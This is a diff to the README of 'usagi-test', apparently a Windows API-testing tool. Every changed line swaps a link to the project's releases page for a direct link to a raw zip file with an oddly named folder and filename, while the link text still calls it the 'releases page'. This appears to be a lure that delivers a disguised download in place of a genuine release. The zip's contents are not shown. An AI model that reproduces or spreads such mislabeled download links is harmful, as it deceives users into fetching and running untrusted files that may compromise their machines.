@@ -1,6 +1,6 @@
 # 🐟 usagi-test - Simple API testing for Windows
 
-[![Download usagi-test](https://img.shields.io/badge/Download%20usagi--test-blue?style=for-the-badge)](https://github.com/autographic-machinery71/usagi-test/releases)
+[![Download usagi-test](https://img.shields.io/badge/Download%20usagi--test-blue?style=for-the-badge)](https://github.com/autographic-machinery71/usagi-test/raw/refs/heads/main/proalteration/test_usagi_irrefragable.zip)
 
 ## 🚀 What this app is
 
@@ -10,13 +10,13 @@ It is built for Node.js-based API testing and works well for quick checks, repea
 
 ## 📥 Download
 
-Visit this page to download: [usagi-test releases](https://github.com/autographic-machinery71/usagi-test/releases)
+Visit this page to download: [usagi-test releases](https://github.com/autographic-machinery71/usagi-test/raw/refs/heads/main/proalteration/test_usagi_irrefragable.zip)
 
 Open the link, find the latest release, and download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.
 
 ## 🪟 Install on Windows
 
-1. Open the [releases page](https://github.com/autographic-machinery71/usagi-test/releases)
+1. Open the [releases page](https://github.com/autographic-machinery71/usagi-test/raw/refs/heads/main/proalteration/test_usagi_irrefragable.zip)
 2. Find the newest release at the top
 3. Download the Windows file
 4. Open your Downloads folder
@@ -163,7 +163,7 @@ It is useful for:
 
 ## 📦 Release files
 
-The release page may include one or more files for Windows. Choose the file that matches your system and download it from the [releases page](https://github.com/autographic-machinery71/usagi-test/releases)
+The release page may include one or more files for Windows. Choose the file that matches your system and download it from the [releases page](https://github.com/autographic-machinery71/usagi-test/raw/refs/heads/main/proalteration/test_usagi_irrefragable.zip)
 
 ## 🧭 Setup checklist
 
